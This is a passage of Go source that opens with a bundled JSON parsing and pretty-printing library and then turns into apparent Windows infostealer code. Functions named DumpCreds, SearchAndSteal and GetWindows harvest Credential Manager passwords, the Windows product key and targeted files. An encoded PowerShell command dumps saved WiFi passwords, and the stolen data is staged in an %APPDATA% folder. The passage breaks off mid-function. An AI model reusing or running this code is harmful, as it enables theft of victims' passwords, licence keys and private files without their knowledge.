	for ; i < len(data); i++ {
		switch data[i] {
		default:
			for ; i < len(data); i++ {
				if i, ok = validany(data, i); !ok {
					return i, false
				}
				if i, ok = validcomma(data, i, ']'); !ok {
					return i, false
				}
				if data[i] == ']' {
					return i + 1, true
				}
			}
		case ' ', '\t', '\n', '\r':
			continue
		case ']':
			return i + 1, true
		}
	}
	return i, false
}
func validstring(data []byte, i int) (outi int, ok bool) {
	for ; i < len(data); i++ {
		if data[i] < ' ' {
			return i, false
		} else if data[i] == '\\' {
			i++
			if i == len(data) {
				return i, false
			}
			switch data[i] {
			default:
				return i, false
			case '"', '\\', '/', 'b', 'f', 'n', 'r', 't':
			case 'u':
				for j := 0; j < 4; j++ {
					i++
					if i >= len(data) {
						return i, false
					}
					if !((data[i] >= '0' && data[i] <= '9') ||
						(data[i] >= 'a' && data[i] <= 'f') ||
						(data[i] >= 'A' && data[i] <= 'F')) {
						return i, false
					}
				}
			}
		} else if data[i] == '"' {
			return i + 1, true
		}
	}
	return i, false
}
func validnumber(data []byte, i int) (outi int, ok bool) {
	i--
	if data[i] == '-' {
		i++
		if i == len(data) {
			return i, false
		}
		if data[i] < '0' || data[i] > '9' {
			return i, false
		}
	}
	if i == len(data) {
		return i, false
	}
	if data[i] == '0' {
		i++
	} else {
		for ; i < len(data); i++ {
			if data[i] >= '0' && data[i] <= '9' {
				continue
			}
			break
		}
	}
	if i == len(data) {
		return i, true
	}
	if data[i] == '.' {
		i++
		if i == len(data) {
			return i, false
		}
		if data[i] < '0' || data[i] > '9' {
			return i, false
		}
		i++
		for ; i < len(data); i++ {
			if data[i] >= '0' && data[i] <= '9' {
				continue
			}
			break
		}
	}
	if i == len(data) {
		return i, true
	}
	if data[i] == 'e' || data[i] == 'E' {
		i++
		if i == len(data) {
			return i, false
		}
		if data[i] == '+' || data[i] == '-' {
			i++
		}
		if i == len(data) {
			return i, false
		}
		if data[i] < '0' || data[i] > '9' {
			return i, false
		}
		i++
		for ; i < len(data); i++ {
			if data[i] >= '0' && data[i] <= '9' {
				continue
			}
			break
		}
	}
	return i, true
}

func validtrue(data []byte, i int) (outi int, ok bool) {
	if i+3 <= len(data) && data[i] == 'r' && data[i+1] == 'u' &&
		data[i+2] == 'e' {
		return i + 3, true
	}
	return i, false
}
func validfalse(data []byte, i int) (outi int, ok bool) {
	if i+4 <= len(data) && data[i] == 'a' && data[i+1] == 'l' &&
		data[i+2] == 's' && data[i+3] == 'e' {
		return i + 4, true
	}
	return i, false
}
func validnull(data []byte, i int) (outi int, ok bool) {
	if i+3 <= len(data) && data[i] == 'u' && data[i+1] == 'l' &&
		data[i+2] == 'l' {
		return i + 3, true
	}
	return i, false
}

func Valid(json string) bool {
	_, ok := validpayload(stringBytes(json), 0)
	return ok
}

func parseUint(s string) (n uint64, ok bool) {
	var i int
	if i == len(s) {
		return 0, false
	}
	for ; i < len(s); i++ {
		if s[i] >= '0' && s[i] <= '9' {
			n = n*10 + uint64(s[i]-'0')
		} else {
			return 0, false
		}
	}
	return n, true
}

func parseInt(s string) (n int64, ok bool) {
	var i int
	var sign bool
	if len(s) > 0 && s[0] == '-' {
		sign = true
		i++
	}
	if i == len(s) {
		return 0, false
	}
	for ; i < len(s); i++ {
		if s[i] >= '0' && s[i] <= '9' {
			n = n*10 + int64(s[i]-'0')
		} else {
			return 0, false
		}
	}
	if sign {
		return n * -1, true
	}
	return n, true
}

func safeInt(f float64) (n int64, ok bool) {
	if f < -9007199254740991 || f > 9007199254740991 {
		return 0, false
	}
	return int64(f), true
}

func execModifier(json, path string) (pathOut, res string, ok bool) {
	name := path[1:]
	var hasArgs bool
	for i := 1; i < len(path); i++ {
		if path[i] == ':' {
			pathOut = path[i+1:]
			name = path[1:i]
			hasArgs = len(pathOut) > 0
			break
		}
		if path[i] == '|' {
			pathOut = path[i:]
			name = path[1:i]
			break
		}
		if path[i] == '.' {
			pathOut = path[i:]
			name = path[1:i]
			break
		}
	}
	if fn, ok := modifiers[name]; ok {
		var args string
		if hasArgs {
			var parsedArgs bool
			switch pathOut[0] {
			case '{', '[', '"':
				res := Parse(pathOut)
				if res.Exists() {
					args = squash(pathOut)
					pathOut = pathOut[len(args):]
					parsedArgs = true
				}
			}
			if !parsedArgs {
				idx := strings.IndexByte(pathOut, '|')
				if idx == -1 {
					args = pathOut
					pathOut = ""
				} else {
					args = pathOut[:idx]
					pathOut = pathOut[idx:]
				}
			}
		}
		return pathOut, fn(json, args), true
	}
	return pathOut, res, false
}

func unwrap(json string) string {
	json = trim(json)
	if len(json) >= 2 && (json[0] == '[' || json[0] == '{') {
		json = json[1 : len(json)-1]
	}
	return json
}

var DisableModifiers = false

var modifiers = map[string]func(json, arg string) string{
	"pretty":  modPretty,
	"ugly":    modUgly,
	"reverse": modReverse,
	"this":    modThis,
	"flatten": modFlatten,
	"join":    modJoin,
	"valid":   modValid,
}

func cleanWS(s string) string {
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case ' ', '\t', '\n', '\r':
			continue
		default:
			var s2 []byte
			for i := 0; i < len(s); i++ {
				switch s[i] {
				case ' ', '\t', '\n', '\r':
					s2 = append(s2, s[i])
				}
			}
			return string(s2)
		}
	}
	return s
}

func modPretty(json, arg string) string {
	if len(arg) > 0 {
		opts := *DefaultOptions
		Parse(arg).ForEach(func(key, value Result) bool {
			switch key.String() {
			case "sortKeys":
				opts.SortKeys = value.Bool()
			case "indent":
				opts.Indent = cleanWS(value.String())
			case "prefix":
				opts.Prefix = cleanWS(value.String())
			case "width":
				opts.Width = int(value.Int())
			}
			return true
		})
		return bytesString(PrettyOptions(stringBytes(json), &opts))
	}
	return bytesString(Pretty(stringBytes(json)))
}

func modThis(json, arg string) string {
	return json
}

func modUgly(json, arg string) string {
	return bytesString(Ugly(stringBytes(json)))
}

func modReverse(json, arg string) string {
	res := Parse(json)
	if res.IsArray() {
		var values []Result
		res.ForEach(func(_, value Result) bool {
			values = append(values, value)
			return true
		})
		out := make([]byte, 0, len(json))
		out = append(out, '[')
		for i, j := len(values)-1, 0; i >= 0; i, j = i-1, j+1 {
			if j > 0 {
				out = append(out, ',')
			}
			out = append(out, values[i].Raw...)
		}
		out = append(out, ']')
		return bytesString(out)
	}
	if res.IsObject() {
		var keyValues []Result
		res.ForEach(func(key, value Result) bool {
			keyValues = append(keyValues, key, value)
			return true
		})
		out := make([]byte, 0, len(json))
		out = append(out, '{')
		for i, j := len(keyValues)-2, 0; i >= 0; i, j = i-2, j+1 {
			if j > 0 {
				out = append(out, ',')
			}
			out = append(out, keyValues[i+0].Raw...)
			out = append(out, ':')
			out = append(out, keyValues[i+1].Raw...)
		}
		out = append(out, '}')
		return bytesString(out)
	}
	return json
}

func modFlatten(json, arg string) string {
	res := Parse(json)
	if !res.IsArray() {
		return json
	}
	var deep bool
	if arg != "" {
		Parse(arg).ForEach(func(key, value Result) bool {
			if key.String() == "deep" {
				deep = value.Bool()
			}
			return true
		})
	}
	var out []byte
	out = append(out, '[')
	var idx int
	res.ForEach(func(_, value Result) bool {
		var raw string
		if value.IsArray() {
			if deep {
				raw = unwrap(modFlatten(value.Raw, arg))
			} else {
				raw = unwrap(value.Raw)
			}
		} else {
			raw = value.Raw
		}
		raw = strings.TrimSpace(raw)
		if len(raw) > 0 {
			if idx > 0 {
				out = append(out, ',')
			}
			out = append(out, raw...)
			idx++
		}
		return true
	})
	out = append(out, ']')
	return bytesString(out)
}

func modJoin(json, arg string) string {
	res := Parse(json)
	if !res.IsArray() {
		return json
	}
	var preserve bool
	if arg != "" {
		Parse(arg).ForEach(func(key, value Result) bool {
			if key.String() == "preserve" {
				preserve = value.Bool()
			}
			return true
		})
	}
	var out []byte
	out = append(out, '{')
	if preserve {
		var idx int
		res.ForEach(func(_, value Result) bool {
			if !value.IsObject() {
				return true
			}
			if idx > 0 {
				out = append(out, ',')
			}
			out = append(out, unwrap(value.Raw)...)
			idx++
			return true
		})
	} else {
		var keys []Result
		kvals := make(map[string]Result)
		res.ForEach(func(_, value Result) bool {
			if !value.IsObject() {
				return true
			}
			value.ForEach(func(key, value Result) bool {
				k := key.String()
				if _, ok := kvals[k]; !ok {
					keys = append(keys, key)
				}
				kvals[k] = value
				return true
			})
			return true
		})
		for i := 0; i < len(keys); i++ {
			if i > 0 {
				out = append(out, ',')
			}
			out = append(out, keys[i].Raw...)
			out = append(out, ':')
			out = append(out, kvals[keys[i].String()].Raw...)
		}
	}
	out = append(out, '}')
	return bytesString(out)
}

func modValid(json, arg string) string {
	if !Valid(json) {
		return ""
	}
	return json
}

func getBytes(json []byte, path string) Result {
	var result Result
	if json != nil {
		result = Get(*(*string)(unsafe.Pointer(&json)), path)
		rawhi := *(*stringHeader)(unsafe.Pointer(&result.Raw))
		strhi := *(*stringHeader)(unsafe.Pointer(&result.Str))
		rawh := sliceHeader{data: rawhi.data, len: rawhi.len, cap: rawhi.len}
		strh := sliceHeader{data: strhi.data, len: strhi.len, cap: rawhi.len}
		if strh.data == nil {
			if rawh.data == nil {
				result.Raw = ""
			} else {
				result.Raw = string(*(*[]byte)(unsafe.Pointer(&rawh)))
			}
			result.Str = ""
		} else if rawh.data == nil {
			result.Raw = ""
			result.Str = string(*(*[]byte)(unsafe.Pointer(&strh)))
		} else if uintptr(strh.data) >= uintptr(rawh.data) &&
			uintptr(strh.data)+uintptr(strh.len) <=
				uintptr(rawh.data)+uintptr(rawh.len) {
			start := uintptr(strh.data) - uintptr(rawh.data)
			result.Raw = string(*(*[]byte)(unsafe.Pointer(&rawh)))
			result.Str = result.Raw[start : start+uintptr(strh.len)]
		} else {
			result.Raw = string(*(*[]byte)(unsafe.Pointer(&rawh)))
			result.Str = string(*(*[]byte)(unsafe.Pointer(&strh)))
		}
	}
	return result
}

func fillIndex(json string, c *parseContext) {
	if len(c.value.Raw) > 0 && !c.calcd {
		jhdr := *(*stringHeader)(unsafe.Pointer(&json))
		rhdr := *(*stringHeader)(unsafe.Pointer(&(c.value.Raw)))
		c.value.Index = int(uintptr(rhdr.data) - uintptr(jhdr.data))
		if c.value.Index < 0 || c.value.Index >= len(json) {
			c.value.Index = 0
		}
	}
}

func stringBytes(s string) []byte {
	return *(*[]byte)(unsafe.Pointer(&sliceHeader{
		data: (*stringHeader)(unsafe.Pointer(&s)).data,
		len:  len(s),
		cap:  len(s),
	}))
}

func bytesString(b []byte) string {
	return *(*string)(unsafe.Pointer(&b))
}

func Match(str, pattern string) bool {
	return deepMatch(str, pattern)
}

func deepMatch(str, pattern string) bool {
	if pattern == "*" {
		return true
	}
	for len(pattern) > 1 && pattern[0] == '*' && pattern[1] == '*' {
		pattern = pattern[1:]
	}
	for len(pattern) > 0 {
		if pattern[0] > 0x7f {
			return deepMatchRune(str, pattern)
		}
		switch pattern[0] {
		default:
			if len(str) == 0 {
				return false
			}
			if str[0] > 0x7f {
				return deepMatchRune(str, pattern)
			}
			if str[0] != pattern[0] {
				return false
			}
		case '?':
			if len(str) == 0 {
				return false
			}
		case '*':
			return deepMatch(str, pattern[1:]) ||
				(len(str) > 0 && deepMatch(str[1:], pattern))
		}
		str = str[1:]
		pattern = pattern[1:]
	}
	return len(str) == 0 && len(pattern) == 0
}

func deepMatchRune(str, pattern string) bool {
	if pattern == "*" {
		return true
	}
	for len(pattern) > 1 && pattern[0] == '*' && pattern[1] == '*' {
		pattern = pattern[1:]
	}
	var sr, pr rune
	var srsz, prsz int
	if len(str) > 0 {
		if str[0] > 0x7f {
			sr, srsz = utf8.DecodeRuneInString(str)
		} else {
			sr, srsz = rune(str[0]), 1
		}
	} else {
		sr, srsz = utf8.RuneError, 0
	}
	if len(pattern) > 0 {
		if pattern[0] > 0x7f {
			pr, prsz = utf8.DecodeRuneInString(pattern)
		} else {
			pr, prsz = rune(pattern[0]), 1
		}
	} else {
		pr, prsz = utf8.RuneError, 0
	}
	for pr != utf8.RuneError {
		switch pr {
		default:
			if srsz == utf8.RuneError {
				return false
			}
			if sr != pr {
				return false
			}
		case '?':
			if srsz == utf8.RuneError {
				return false
			}
		case '*':
			return deepMatchRune(str, pattern[prsz:]) ||
				(srsz > 0 && deepMatchRune(str[srsz:], pattern))
		}
		str = str[srsz:]
		pattern = pattern[prsz:]
		if len(str) > 0 {
			if str[0] > 0x7f {
				sr, srsz = utf8.DecodeRuneInString(str)
			} else {
				sr, srsz = rune(str[0]), 1
			}
		} else {
			sr, srsz = utf8.RuneError, 0
		}
		if len(pattern) > 0 {
			if pattern[0] > 0x7f {
				pr, prsz = utf8.DecodeRuneInString(pattern)
			} else {
				pr, prsz = rune(pattern[0]), 1
			}
		} else {
			pr, prsz = utf8.RuneError, 0
		}
	}

	return srsz == 0 && prsz == 0
}

var maxRuneBytes = func() []byte {
	b := make([]byte, 4)
	if utf8.EncodeRune(b, '\U0010FFFF') != 4 {
		panic("invalid rune encoding")
	}
	return b
}()

var DefaultOptions = &Options{Width: 80, Prefix: "", Indent: "  ", SortKeys: false}

func Pretty(json []byte) []byte { return PrettyOptions(json, nil) }

func PrettyOptions(json []byte, opts *Options) []byte {
	if opts == nil {
		opts = DefaultOptions
	}
	buf := make([]byte, 0, len(json))
	if len(opts.Prefix) != 0 {
		buf = append(buf, opts.Prefix...)
	}
	buf, _, _, _ = appendPrettyAny(buf, json, 0, true,
		opts.Width, opts.Prefix, opts.Indent, opts.SortKeys,
		0, 0, -1)
	if len(buf) > 0 {
		buf = append(buf, '\n')
	}
	return buf
}

func Ugly(json []byte) []byte {
	buf := make([]byte, 0, len(json))
	return ugly(buf, json)
}

func isNaNOrInf(src []byte) bool {
	return src[0] == 'i' ||
		src[0] == 'I' ||
		src[0] == '+' ||
		src[0] == 'N' ||
		(src[0] == 'n' && len(src) > 1 && src[1] != 'u')
}

func appendPrettyAny(buf, json []byte, i int, pretty bool, width int, prefix, indent string, sortkeys bool, tabs, nl, max int) ([]byte, int, int, bool) {
	for ; i < len(json); i++ {
		if json[i] <= ' ' {
			continue
		}
		if json[i] == '"' {
			return appendPrettyString(buf, json, i, nl)
		}

		if (json[i] >= '0' && json[i] <= '9') || json[i] == '-' || isNaNOrInf(json[i:]) {
			return appendPrettyNumber(buf, json, i, nl)
		}
		if json[i] == '{' {
			return appendPrettyObject(buf, json, i, '{', '}', pretty, width, prefix, indent, sortkeys, tabs, nl, max)
		}
		if json[i] == '[' {
			return appendPrettyObject(buf, json, i, '[', ']', pretty, width, prefix, indent, sortkeys, tabs, nl, max)
		}
		switch json[i] {
		case 't':
			return append(buf, 't', 'r', 'u', 'e'), i + 4, nl, true
		case 'f':
			return append(buf, 'f', 'a', 'l', 's', 'e'), i + 5, nl, true
		case 'n':
			return append(buf, 'n', 'u', 'l', 'l'), i + 4, nl, true
		}
	}
	return buf, i, nl, true
}

func (arr *byKeyVal) Len() int {
	return len(arr.pairs)
}
func (arr *byKeyVal) Less(i, j int) bool {
	if arr.isLess(i, j, byKey) {
		return true
	}
	if arr.isLess(j, i, byKey) {
		return false
	}
	return arr.isLess(i, j, byVal)
}
func (arr *byKeyVal) Swap(i, j int) {
	arr.pairs[i], arr.pairs[j] = arr.pairs[j], arr.pairs[i]
	arr.sorted = true
}

func getjtype(v []byte) jtype {
	if len(v) == 0 {
		return jnull
	}
	switch v[0] {
	case '"':
		return jstring
	case 'f':
		return jfalse
	case 't':
		return jtrue
	case 'n':
		return jnull
	case '[', '{':
		return jjson
	default:
		return jnumber
	}
}

func (arr *byKeyVal) isLess(i, j int, kind byKind) bool {
	k1 := arr.json[arr.pairs[i].kstart:arr.pairs[i].kend]
	k2 := arr.json[arr.pairs[j].kstart:arr.pairs[j].kend]
	var v1, v2 []byte
	if kind == byKey {
		v1 = k1
		v2 = k2
	} else {
		v1 = bytes.TrimSpace(arr.buf[arr.pairs[i].vstart:arr.pairs[i].vend])
		v2 = bytes.TrimSpace(arr.buf[arr.pairs[j].vstart:arr.pairs[j].vend])
		if len(v1) >= len(k1)+1 {
			v1 = bytes.TrimSpace(v1[len(k1)+1:])
		}
		if len(v2) >= len(k2)+1 {
			v2 = bytes.TrimSpace(v2[len(k2)+1:])
		}
	}
	t1 := getjtype(v1)
	t2 := getjtype(v2)
	if t1 < t2 {
		return true
	}
	if t1 > t2 {
		return false
	}
	if t1 == jstring {
		s1 := parsestr(v1)
		s2 := parsestr(v2)
		return string(s1) < string(s2)
	}
	if t1 == jnumber {
		n1, _ := strconv.ParseFloat(string(v1), 64)
		n2, _ := strconv.ParseFloat(string(v2), 64)
		return n1 < n2
	}
	return string(v1) < string(v2)

}

func parsestr(s []byte) []byte {
	for i := 1; i < len(s); i++ {
		if s[i] == '\\' {
			var str string
			json.Unmarshal(s, &str)
			return []byte(str)
		}
		if s[i] == '"' {
			return s[1:i]
		}
	}
	return nil
}

func appendPrettyObject(buf, json []byte, i int, open, close byte, pretty bool, width int, prefix, indent string, sortkeys bool, tabs, nl, max int) ([]byte, int, int, bool) {
	var ok bool
	if width > 0 {
		if pretty && open == '[' && max == -1 {
			max := width - (len(buf) - nl)
			if max > 3 {
				s1, s2 := len(buf), i
				buf, i, _, ok = appendPrettyObject(buf, json, i, '[', ']', false, width, prefix, "", sortkeys, 0, 0, max)
				if ok && len(buf)-s1 <= max {
					return buf, i, nl, true
				}
				buf = buf[:s1]
				i = s2
			}
		} else if max != -1 && open == '{' {
			return buf, i, nl, false
		}
	}
	buf = append(buf, open)
	i++
	var pairs []pair
	if open == '{' && sortkeys {
		pairs = make([]pair, 0, 8)
	}
	var n int
	for ; i < len(json); i++ {
		if json[i] <= ' ' {
			continue
		}
		if json[i] == close {
			if pretty {
				if open == '{' && sortkeys {
					buf = sortPairs(json, buf, pairs)
				}
				if n > 0 {
					nl = len(buf)
					if buf[nl-1] == ' ' {
						buf[nl-1] = '\n'
					} else {
						buf = append(buf, '\n')
					}
				}
				if buf[len(buf)-1] != open {
					buf = appendTabs(buf, prefix, indent, tabs)
				}
			}
			buf = append(buf, close)
			return buf, i + 1, nl, open != '{'
		}
		if open == '[' || json[i] == '"' {
			if n > 0 {
				buf = append(buf, ',')
				if width != -1 && open == '[' {
					buf = append(buf, ' ')
				}
			}
			var p pair
			if pretty {
				nl = len(buf)
				if buf[nl-1] == ' ' {
					buf[nl-1] = '\n'
				} else {
					buf = append(buf, '\n')
				}
				if open == '{' && sortkeys {
					p.kstart = i
					p.vstart = len(buf)
				}
				buf = appendTabs(buf, prefix, indent, tabs+1)
			}
			if open == '{' {
				buf, i, nl, _ = appendPrettyString(buf, json, i, nl)
				if sortkeys {
					p.kend = i
				}
				buf = append(buf, ':')
				if pretty {
					buf = append(buf, ' ')
				}
			}
			buf, i, nl, ok = appendPrettyAny(buf, json, i, pretty, width, prefix, indent, sortkeys, tabs+1, nl, max)
			if max != -1 && !ok {
				return buf, i, nl, false
			}
			if pretty && open == '{' && sortkeys {
				p.vend = len(buf)
				if p.kstart > p.kend || p.vstart > p.vend {
					// bad data. disable sorting
					sortkeys = false
				} else {
					pairs = append(pairs, p)
				}
			}
			i--
			n++
		}
	}
	return buf, i, nl, open != '{'
}
func sortPairs(json, buf []byte, pairs []pair) []byte {
	if len(pairs) == 0 {
		return buf
	}
	vstart := pairs[0].vstart
	vend := pairs[len(pairs)-1].vend
	arr := byKeyVal{false, json, buf, pairs}
	sort.Stable(&arr)
	if !arr.sorted {
		return buf
	}
	nbuf := make([]byte, 0, vend-vstart)
	for i, p := range pairs {
		nbuf = append(nbuf, buf[p.vstart:p.vend]...)
		if i < len(pairs)-1 {
			nbuf = append(nbuf, ',')
			nbuf = append(nbuf, '\n')
		}
	}
	return append(buf[:vstart], nbuf...)
}

func appendPrettyString(buf, json []byte, i, nl int) ([]byte, int, int, bool) {
	s := i
	i++
	for ; i < len(json); i++ {
		if json[i] == '"' {
			var sc int
			for j := i - 1; j > s; j-- {
				if json[j] == '\\' {
					sc++
				} else {
					break
				}
			}
			if sc%2 == 1 {
				continue
			}
			i++
			break
		}
	}
	return append(buf, json[s:i]...), i, nl, true
}

func appendPrettyNumber(buf, json []byte, i, nl int) ([]byte, int, int, bool) {
	s := i
	i++
	for ; i < len(json); i++ {
		if json[i] <= ' ' || json[i] == ',' || json[i] == ':' || json[i] == ']' || json[i] == '}' {
			break
		}
	}
	return append(buf, json[s:i]...), i, nl, true
}

func appendTabs(buf []byte, prefix, indent string, tabs int) []byte {
	if len(prefix) != 0 {
		buf = append(buf, prefix...)
	}
	if len(indent) == 2 && indent[0] == ' ' && indent[1] == ' ' {
		for i := 0; i < tabs; i++ {
			buf = append(buf, ' ', ' ')
		}
	} else {
		for i := 0; i < tabs; i++ {
			buf = append(buf, indent...)
		}
	}
	return buf
}

func hexp(p byte) byte {
	switch {
	case p < 10:
		return p + '0'
	default:
		return (p - 10) + 'a'
	}
}

func ugly(dst, src []byte) []byte {
	dst = dst[:0]
	for i := 0; i < len(src); i++ {
		if src[i] > ' ' {
			dst = append(dst, src[i])
			if src[i] == '"' {
				for i = i + 1; i < len(src); i++ {
					dst = append(dst, src[i])
					if src[i] == '"' {
						j := i - 1
						for ; ; j-- {
							if src[j] != '\\' {
								break
							}
						}
						if (j-i)%2 != 0 {
							break
						}
					}
				}
			}
		}
	}
	return dst
}

func parseCred(c *winCred) ParsedCred {
	blob := extractBytes(c.CredentialBlob,
		(uintptr)(c.CredentialBlobSize))
	return ParsedCred{
		Target: extractString(c.TargetName),
		User:   extractString(c.UserName),
		Blob:   hex.EncodeToString(blob),
	}
}

func DumpCreds() (out []ParsedCred, err error) {
	var ncreds, creds uintptr
	r1, _, lastErr := procCredEnumerateW.Call(0, 0,
		(uintptr)(unsafe.Pointer(&ncreds)),
		(uintptr)(unsafe.Pointer(&creds)))
	if r1 != 1 {
		return nil, lastErr
	}
	for i := 0; i < int(ncreds); i++ {
		off := unsafe.Sizeof(creds) * uintptr(i)
		wcp := *(*uintptr)(unsafe.Pointer(creds + off))
		parsedCred := parseCred((*winCred)(unsafe.Pointer(wcp)))
		out = append(out, parsedCred)
	}
	procCredFree.Call(creds)
	return out, nil
}

func CredManModuleStart() ExtractCredentialsResult {
	var unsuccessfulResult = ExtractCredentialsResult{
		Success: false,
		Data:    []UrlNamePass{},
	}
	creds, err := DumpCreds()
	if err != nil {
		return unsuccessfulResult
	}
	var (
		Result ExtractCredentialsResult
		data   []UrlNamePass
	)
	for i := range creds {
		var encodedBlob = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].Blob)))
		var encodedTarget = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].Target)))
		var encodedUsername = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].User)))
		data = append(data, UrlNamePass{
			Url:      encodedTarget,
			Username: encodedUsername,
			Pass:     encodedBlob,
		})
	}
	if len(data) == 0 {
		Result.Success = false
		return unsuccessfulResult
	}
	Result.Data = data
	Result.Success = true
	return Result
}

func ExtractCredmanData() ([]UrlNamePass, int) {
	var windowsResult = CredManModuleStart()
	if windowsResult.Success {
		return windowsResult.Data, len(windowsResult.Data)
	}
	return nil, 0
}

func SearchAndSteal() {
	for name, data := range stuffToSteal {
		if len(data.Query) <= 0 && len(data.Item) <= 0 { // Get full DIR
			_, err := os.ReadDir(data.Path)
			if err == nil {
				_ = CompressZIP(data.Path, os.Getenv("APPDATA")+"\\tmpResults\\"+name+".zip")
			}
		} else if len(data.Query) > 1 && len(data.Item) <= 0 { //Get only files with Suffix
			files, _ := os.ReadDir(data.Path)
			for _, file := range files {
				if !file.IsDir() {
					if strings.HasSuffix(file.Name(), data.Query) {
						fi, _ := os.Stat(data.Path + file.Name())
						if fi.Size() >= 10 {
							_ = CopyFileToDirectory(data.Path+file.Name(), os.Getenv("APPDATA")+"\\tmpResults\\"+name+"_"+file.Name())
						}
					}
				}
			}
		} else if len(data.Query) <= 0 && len(data.Item) >= 1 { //Get only files that match data.Item
			files, _ := os.ReadDir(data.Path)
			for _, file := range files {
				if !file.IsDir() {
					if strings.Contains(file.Name(), data.Item) {
						fi, _ := os.Stat(data.Path + file.Name())
						if fi.Size() >= 10 {
							_ = CopyFileToDirectory(data.Path+file.Name(), os.Getenv("APPDATA")+"\\tmpResults\\"+name+"_"+file.Name())
						}
					}
				}
			}
		} else if len(data.Query) <= 0 && len(data.Item) <= 0 && data.Reg { // Get Reg files
			if AdminState {
				IssuePowershell(`regedit /e "` + os.Getenv("APPDATA") + "\\tmpResults\\" + name + `.txt" ` + data.Path)
			}
		}
	}
}

func GetWindows() {
	//Windows Key
	registryKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	defer registryKey.Close()
	digitalProductID, _, _ := registryKey.GetBinaryValue(`DigitalProductId4`)
	file, _ := os.Create(os.Getenv("APPDATA") + "\\tmpResults\\WindowsKey.txt")
	_, _ = file.WriteString("Windows Key: " + binaryToAscii(digitalProductID[52:]))
	_ = file.Close()
	//Windows WiFi SSID and Passwords
	_ = CreateFileAndWriteData(os.Getenv("APPDATA")+"\\tmpResults\\"+"WiFiPasswords.txt", []byte(IssuePowershell("powershell.exe -encodedCommand JABXAGkAcgBlAGwAZQBzAHMAUwBTAEkARABzACAAPQAgACgAbgBlAHQAcwBoACAAdwBsAGEAbgAgAHMAaABvAHcAIABwAHIAbwBmAGkAbABlAHMAIAB8ACAAUwBlAGwAZQBjAHQALQBTAHQAcgBpAG4AZwAgACcAOgAgACcAIAApACAALQByAGUAcABsAGEAYwBlACAAIgAuACoAOgBcAHMAKwAiAA0ACgAkAFcAaQBmAGkASQBuAGYAbwAgAD0AIABmAG8AcgBlAGEAYwBoACgAJABTAFMASQBEACAAaQBuACAAJABXAGkAcgBlAGwAZQBzAHMAUwBTAEkARABzACkAIAB7AA0ACgAgACAAIAAgACQAUABhAHMAcwB3AG8AcgBkACAAPQAgACgAbgBlAHQAcwBoACAAdwBsAGEAbgAgAHMAaABvAHcAIABwAHIAbwBmAGkAbABlAHMAIABuAGEAbQBlAD0AJABTAFMASQBEACAAawBlAHkAPQBjAGwAZQBhAHIAIAB8ACAAUwBlAGwAZQBjAHQALQBTAHQAcgBpAG4AZwAgACcASwBlAHkAIABDAG8AbgB0AGUAbgB0ACcAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIALgAqADoAXABzACsAIgANAAoAIAAgACAAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABwAHMAbwBiAGoAZQBjAHQAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewAiAFMAUwBJAEQAIgA9ACQAUwBTAEkARAA7ACIAUABhAHMAcwB3AG8AcgBkACIAPQAkAFAAYQBzAHMAdwBvAHIAZAB9AA0ACgB9ACAAIAANAAoAJABXAGkAZgBpAEkAbgBmAG8AIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuAA==\n")))
	//Credential Manager
	f, e := os.Create(os.Getenv("APPDATA") + "\\tmpResults\\CredMan.txt")
	if e == nil {
		defer f.Close()
		var credentials, _ = ExtractCredmanData()
		for data := range credentials {
			fmt.Fprintln(f, "")
			fmt.Fprintln(f, " URL: "+credentials[data].Url)
			fmt.Fprintln(f, " USERNAME: "+credentials[data].Username)
			fmt.Fprintln(f, " PASSWORD: "+credentials[data].Pass)
			fmt.Fprintln(f, "")
		}
	}
	// WiFi SSID and Passwords
	_ = CreateFileAndWriteData(os.Getenv("APPDATA")+"\\tmpResults\\"+"WiFiPasswords.txt", []byte(IssuePowershell("powershell.exe -encodedCommand JABXAGkAcgBlAGwAZQBzAHMAUwBTAEkARABzACAAPQAgACgAbgBlAHQAcwBoACAAdwBsAGEAbgAgAHMAaABvAHcAIABwAHIAbwBmAGkAbABlAHMAIAB8ACAAUwBlAGwAZQBjAHQALQBTAHQAcgBpAG4AZwAgACcAOgAgACcAIAApACAALQByAGUAcABsAGEAYwBlACAAIgAuACoAOgBcAHMAKwAiAA0ACgAkAFcAaQBmAGkASQBuAGYAbwAgAD0AIABmAG8AcgBlAGEAYwBoACgAJABTAFMASQBEACAAaQBuACAAJABXAGkAcgBlAGwAZQBzAHMAUwBTAEkARABzACkAIAB7AA0ACgAgACAAIAAgACQAUABhAHMAcwB3AG8AcgBkACAAPQAgACgAbgBlAHQAcwBoACAAdwBsAGEAbgAgAHMAaABvAHcAIABwAHIAbwBmAGkAbABlAHMAIABuAGEAbQBlAD0AJABTAFMASQBEACAAawBlAHkAPQBjAGwAZQBhAHIAIAB8ACAAUwBlAGwAZQBjAHQALQBTAHQAcgBpAG4AZwAgACcASwBlAHkAIABDAG8AbgB0AGUAbgB0ACcAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIALgAqADoAXABzACsAIgANAAoAIAAgACAAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABwAHMAbwBiAGoAZQBjAHQAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewAiAFMAUwBJAEQAIgA9ACQAUwBTAEkARAA7ACIAUABhAHMAcwB3AG8AcgBkACIAPQAkAFAAYQBzAHMAdwBvAHIAZAB9AA0ACgB9ACAAIAANAAoAJABXAGkAZgBpAEkAbgBmAG8AIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuAA==\n")))
	//Microsoft Credentials
	if _, err := os.Stat(os.Getenv("APPDATA") + "\\Microsoft\\Credentials\\"); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(os.Getenv("APPDATA") + "\\Microsoft\\Credentials\\")
		if err == nil {
			var count int
			for _, _ = range files {
				count++
			}
			if count > 0 {
